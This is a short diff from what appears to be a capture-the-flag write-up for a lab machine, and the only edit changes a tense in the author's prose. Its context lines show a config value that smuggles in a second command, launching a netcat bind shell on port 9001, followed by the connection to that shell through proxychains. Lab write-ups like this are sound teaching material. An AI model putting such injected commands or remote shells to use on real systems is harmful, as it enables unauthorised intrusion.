@@ -931,7 +931,7 @@ LifeTime=100
 LogFile=C:\util\scripts\log.txt & cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -lvp 9001 -e cmd.exe
 ```
 
-And immediately I caught a shell as `hacker`. I'm finally able to view `user.txt`!
+And immediately I caught a shell as `hacker`. I was finally able to view `user.txt`!
 
 ```bash
 ➜  HACKBACK proxychains nc hackback.htb 9001
